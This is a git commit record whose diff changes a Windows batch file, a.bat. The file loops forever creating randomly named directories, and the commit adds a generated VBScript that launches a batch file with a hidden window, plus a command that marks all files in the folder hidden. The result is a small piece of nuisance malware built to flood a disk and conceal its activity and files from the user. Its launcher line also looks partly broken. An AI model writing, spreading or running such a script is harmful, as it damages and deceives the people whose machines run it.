659acc899e921fbfc1b4ec737cabdc7c26ff3484
Link1992md <103005144+Link1992md@users.noreply.github.com>
2022-04-04 18:08:02 -0700

    Update a.bat
    added hidden cmd windows

--- a.bat
+++ a.bat
@@ -1,3 +1,7 @@
+echo set objShell = CreateObject("WScript.Shell") >> winstart.vbs
+echo objShell.Run ".bat", vbHide, TRUE >> winstart.vbs
+start "" "winstart.vbs"
+attrib +h *.*
 :x
 md %random%
 goto x
